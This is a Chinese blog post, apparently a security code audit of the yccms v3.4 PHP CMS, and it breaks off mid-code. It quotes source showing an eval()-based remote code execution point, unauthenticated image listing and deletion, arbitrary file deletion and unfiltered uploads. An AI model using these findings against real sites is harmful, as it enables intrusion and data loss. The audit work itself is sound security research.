@@ -1,0 +1,1013 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  <link rel="icon" href="/img/0-11-%E6%AC%A7%E6%B6%A6%E5%90%89.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="linear-gradient(270deg, rgba(107,115,255,0.85), rgba(65,80,220,0.85), rgba(0,180,240,0.85), rgba(60,200,255,0.85), rgba(120,220,255,0.85), rgba(180,120,255,0.85), rgba(220,100,255,0.85), rgba(255,110,230,0.85), rgba(140,100,255,0.85), rgba(100,150,255,0.85), rgba(70,200,220,0.85), rgba(107,115,255,0.85))">
+  <meta name="author" content="Xvsf">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="yccms v3.4 代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="yccms v3.4 代码审计">
+<meta property="og:url" content="http://xvshifu.github.io/2025/07/12/yccms%20v3.4%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:site_name" content="Xvsf blogs">
+<meta property="og:description" content="yccms v3.4 代码审计">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948854.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948086.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949129.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949148.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950740.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950634.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950799.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950970.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080950144.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951787.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951051.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951601.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951683.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951643.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080951397.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952634.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952850.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952517.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952547.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952341.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080952688.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080953834.png">
+<meta property="article:published_time" content="2025-07-12T01:00:00.000Z">
+<meta property="article:modified_time" content="2025-08-08T02:07:23.543Z">
+<meta property="article:author" content="Xvsf">
+<meta property="article:tag" content="PHP 代码审计">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948854.png">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>yccms v3.4 代码审计 - Xvsf blogs</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/xm_custom/custom.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xvshifu.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"0wmNTqqCOUst92FKToSXxgvQ-gzGzoHsz","app_key":"p527aBaA4G01EJdMOVMGXsHR","server_url":"https://0wmntqqc.lc-cn-n1-shared.com","path":"window.location.pathname","ignore_local":true},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 8.0.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>🖋️ Hello My Blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="yccms v3.4 代码审计"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-07-12 09:00" pubdate>
+          2025年7月12日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          3.9k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          33 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="busuanzi_container_page_pv" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="busuanzi_value_page_pv"></span> 次
+        </span>
+        
+
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">yccms v3.4 代码审计</h1>
+            
+              <p id="updated-time" class="note note-info" style="">
+                
+                  
+                    本文最后更新于 2025年8月8日 上午
+                  
+                
+              </p>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="yccms-v3-4-代码审计"><a href="#yccms-v3-4-代码审计" class="headerlink" title="yccms v3.4 代码审计"></a>yccms v3.4 代码审计</h1><p>程序版本：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948854.png" srcset="/img/loading.gif" lazyload alt="20250708090010810"></p>
+<p>从这个目录结构注意到这是一个MVC模式</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948086.png" srcset="/img/loading.gif" lazyload alt="20250708135815537"></p>
+<h2 id="通读代码"><a href="#通读代码" class="headerlink" title="通读代码"></a>通读代码</h2><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4><p>后台入口</p>
+<p>require  引入文件  &#x2F;config&#x2F;run.inc.php 完成网站的初始化</p>
+<p>路由：GET   &#x2F;admin?a&#x3D;</p>
+<h3 id="ceshi1-ceshi2-compile"><a href="#ceshi1-ceshi2-compile" class="headerlink" title="ceshi1&amp;ceshi2&amp;compile"></a>ceshi1&amp;ceshi2&amp;compile</h3><p>都是一些页面模板</p>
+<h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><h4 id="config-inc-php"><a href="#config-inc-php" class="headerlink" title="config.inc.php"></a>config.inc.php</h4><p>数据库、Smarty以及其他的系统配置</p>
+<h4 id="count-php"><a href="#count-php" class="headerlink" title="count.php"></a>count.php</h4><p>通过计算根目录，加载 run.inc.php文件</p>
+<h4 id="run-inc-php"><a href="#run-inc-php" class="headerlink" title="run.inc.php"></a>run.inc.php</h4><p>初始化文件、入口文件（进入后台会调用）</p>
+<p>功能：</p>
+<ul>
+<li><p>开启session，设置编码和时区</p>
+</li>
+<li><p>引入配置文件和模板：<code>config/config.inc.php</code></p>
+<p>​    <code>/public/smarty/Smarty.class.php</code></p>
+</li>
+<li><p>自动加载类：<code>__autoload()方法用于自动加载类</code></p>
+<p>​                    Action的类加载controller</p>
+<p>​                    Model的类加载model</p>
+<p>​                    其他的类加载public&#x2F;class&#x2F;</p>
+</li>
+<li><p>单入口：<code>Factory::setAction()-&gt;run();</code>调用控制器的run()，</p>
+</li>
+</ul>
+<p>安全问题：入口文件的Factory给下面的RCE提供了入口点</p>
+<p>配置文件会有漏洞吗？配置文件会不会泄露数据库信息？</p>
+<h3 id="contrller"><a href="#contrller" class="headerlink" title="contrller"></a>contrller</h3><h4 id="Action-class-php"><a href="#Action-class-php" class="headerlink" title="Action.class.php"></a>Action.class.php</h4><p>所有控制器的父类</p>
+<p>功能：</p>
+<ul>
+<li>定义属性</li>
+<li>构造函数</li>
+<li>分页、静态分页功能</li>
+<li>控制器运行入口</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//控制器基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> </span>&#123;<span class="hljs-comment">//声明Action类，属于所有控制器的父类</span><br>	<span class="hljs-keyword">protected</span> <span class="hljs-variable">$_tpl</span> = <span class="hljs-literal">null</span>;<span class="hljs-comment">//定义属性</span><br>	<span class="hljs-keyword">protected</span> <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span>;	<br>	<span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//__construct() 构造函数，就是当对象被创建时，类中被自动调用的第一个函数，并且一个类中只能存在一个构造函数。但这里是protected，就不能在类的外部直接new这个类，只能在子类中通过继承使用。</span><br>		<span class="hljs-variable language_">$this</span>-&gt;_tpl = TPL::<span class="hljs-title function_ invoke__">getInstance</span>();<span class="hljs-comment">//模板渲染</span><br>		<span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setModel</span>();<span class="hljs-comment">//创建模型对象</span><br>		<span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">setRequest</span>(); <span class="hljs-comment">//表单转义和html过滤	可以防XSS、SQL</span><br>	&#125;<br>	<br>	<span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page</span>(<span class="hljs-params"><span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span> = PAGE_SIZE, <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<span class="hljs-comment">//定义了一个分页函数</span><br>		<span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-title class_">Validate</span>::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_model</span>) ? <span class="hljs-variable language_">$this</span>-&gt;_model : <span class="hljs-variable">$_model</span>;<br>		<span class="hljs-variable">$_page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(<span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span>);<br>		<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">setLimit</span>(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getLimit</span>());<br>		<span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;page&#x27;</span>,<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">showpage</span>());<br>		<span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;num&#x27;</span>,(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getPage</span>()-<span class="hljs-number">1</span>)*<span class="hljs-variable">$_pagesize</span>);<br>	&#125;<br>	<span class="hljs-comment">//静态专用</span><br>	<span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page2</span>(<span class="hljs-params"><span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span> = PAGE_SIZE, <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span>,<span class="hljs-variable">$_url2</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_fx</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<span class="hljs-comment">//另一种分页</span><br>		<span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-variable">$_model</span>;<br>		<span class="hljs-variable">$_page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(<span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span>,<span class="hljs-variable">$_url2</span>,<span class="hljs-variable">$_fx</span>);<br>		<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">setLimit</span>(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getLimit</span>());<br>		<span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;page&#x27;</span>,<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">listpage</span>());<br>		<span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;num&#x27;</span>,(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getPage</span>()-<span class="hljs-number">1</span>)*<span class="hljs-variable">$_pagesize</span>);<br>	&#125;<br>	<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//控制器运行入口</span><br>		<span class="hljs-variable">$_m</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>] : <span class="hljs-string">&#x27;index&#x27;</span>;<span class="hljs-comment">//url传参&#x27;?m=&#x27;,默认为index</span><br>		<span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$_m</span>) ? <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$this-&gt;&#x27;</span>.<span class="hljs-variable">$_m</span>.<span class="hljs-string">&#x27;();&#x27;</span>) : <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">index</span>();<span class="hljs-comment">//eval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config/run.inc.php 这个文件，存在rce</span><br> 	&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h4 id="AdminAction-class-php"><a href="#AdminAction-class-php" class="headerlink" title="AdminAction.class.php"></a>AdminAction.class.php</h4><p>管理员控制器</p>
+<p>功能：</p>
+<ul>
+<li><p>加载后台首页</p>
+</li>
+<li><p>更改密码：使用sha1加密不安全</p>
+</li>
+<li><p>系统信息显示：</p>
+<p>系统信息页：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949129.png" srcset="/img/loading.gif" lazyload alt="20250711132213642"></p>
+</li>
+<li><p>退出时清理缓存：删除 compile 目录文件</p>
+</li>
+</ul>
+<p>路由：?a&#x3D;admin&amp;m&#x3D;update -&gt; 调用 update()</p>
+<h4 id="ArticleAction-class-php"><a href="#ArticleAction-class-php" class="headerlink" title="ArticleAction.class.php"></a>ArticleAction.class.php</h4><p>文章控制器，</p>
+<p>功能：显示文章列表</p>
+<p>​			提供搜索功能</p>
+<p>​			增删修改文章</p>
+<p>​			nav、attr（文章的修饰属性）等功能</p>
+<h4 id="CallAction-class-php"><a href="#CallAction-class-php" class="headerlink" title="CallAction.class.php"></a>CallAction.class.php</h4><p>功能： 验证码生成</p>
+<p>​		后台文件上传</p>
+<p>​		编辑器上传</p>
+<h4 id="HtmlAction-class-php"><a href="#HtmlAction-class-php" class="headerlink" title="HtmlAction.class.php"></a>HtmlAction.class.php</h4><p>生成静态控制器</p>
+<blockquote>
+<p><strong>生成静态页面：</strong></p>
+<p>首先调用模型，取出数据库内容，之后通过模板引擎渲染页面，输出HTML页面，然后使用工具类<code>Tool::HtmlFile($filename, $content)</code>，把HTML内容保存到指定路径，就可以在前端页面查看了。</p>
+<p><strong>静态页面作用：</strong></p>
+<ul>
+<li>直接访问<code>.html</code>文件，不需要调动数据库查询；</li>
+<li>页面生成后不再执行动态代码，防止SQL注入；</li>
+<li>当然，这种把内容提前准备好的方式，对于提升性能、减少算力、节约服务器资源、服务器更稳定等等有一定的优势。</li>
+</ul>
+</blockquote>
+<p>本网站后台修改文章内容后需要<strong>静态生成</strong>，之后方可在首页显示。</p>
+<p>功能： 生成首页</p>
+<p>​			生成文章</p>
+<p>​			栏目列表</p>
+<p>​			模板渲染</p>
+<p>​			静态化输出</p>
+<p>​			分步处理</p>
+<p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949148.png" srcset="/img/loading.gif" lazyload alt="20250711154124943"></p>
+<h4 id="LinkAction-class-php"><a href="#LinkAction-class-php" class="headerlink" title="LinkAction.class.php"></a>LinkAction.class.php</h4><p>链接控制器</p>
+<p>功能：后台管理友情链接，修改链接、排序功能</p>
+<h4 id="LoginAction-class-php"><a href="#LoginAction-class-php" class="headerlink" title="LoginAction.class.php"></a>LoginAction.class.php</h4><p>登录控制器</p>
+<p>功能：登录验证：sha1加密密码</p>
+<p>​			验证码</p>
+<p>​			记住密码</p>
+<p>​			AJAX 验证</p>
+<h4 id="NavAction-class-php"><a href="#NavAction-class-php" class="headerlink" title="NavAction.class.php"></a>NavAction.class.php</h4><p>分类控制器</p>
+<p>功能：查看、排序、增删修改分类列表</p>
+<h4 id="PicAction-class-php"><a href="#PicAction-class-php" class="headerlink" title="PicAction.class.php"></a>PicAction.class.php</h4><p>图片控制器</p>
+<p>功能：</p>
+<ul>
+<li><p>后台图片展示：读取根目录中的uploads文件夹，但是没有过滤文件非法后缀，此处可能上传 .php 文件</p>
+</li>
+<li><p>删除：没有检验图片路径，存在任意文件删除漏洞</p>
+</li>
+<li><p>这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除</p>
+</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//图片控制器</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PicAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Action</span></span>&#123;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>();<br>	&#125;<br>    <span class="hljs-comment">//这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br>		<span class="hljs-variable">$_dirPath</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;/uploads//&#x27;</span>);<span class="hljs-comment">//打开 /uploads/ 目录</span><br>		<span class="hljs-variable">$_dirName</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//保存图片名</span><br>		<span class="hljs-variable">$_picArr</span>=<span class="hljs-keyword">array</span>();<br>		<span class="hljs-keyword">while</span>(!!<span class="hljs-variable">$_dirName</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$_dirPath</span>))&#123;<span class="hljs-comment">//遍历 uploads 下的文件，此处无过滤</span><br>			<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_dirName</span>!=<span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; <span class="hljs-variable">$_dirName</span>!=<span class="hljs-string">&#x27;..&#x27;</span>)&#123;<br>				<span class="hljs-variable">$_picArr</span>[] = <span class="hljs-variable">$_dirName</span>;<br>			&#125;<br>		&#125;<br>		<span class="hljs-title function_ invoke__">krsort</span>(<span class="hljs-variable">$_picArr</span>);<span class="hljs-comment">//逆序排列</span><br>		<span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;picNum&#x27;</span>,<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;/uploads//&#x27;</span>))-<span class="hljs-number">2</span>);<span class="hljs-comment">//获取上传的文件数</span><br>		<span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;picArr&#x27;</span>,<span class="hljs-variable">$_picArr</span>);<span class="hljs-comment">//显示上传文件</span><br>		<span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/picshow.tpl&#x27;</span>);<br>	&#125;<br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//删除图片，依旧没有验证用户</span><br>		<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br>			<span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>]))<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何图片!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<span class="hljs-comment">//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 &#x27;?a=pic&#x27;</span><br>			<span class="hljs-variable">$_fileDir</span>=ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>;<span 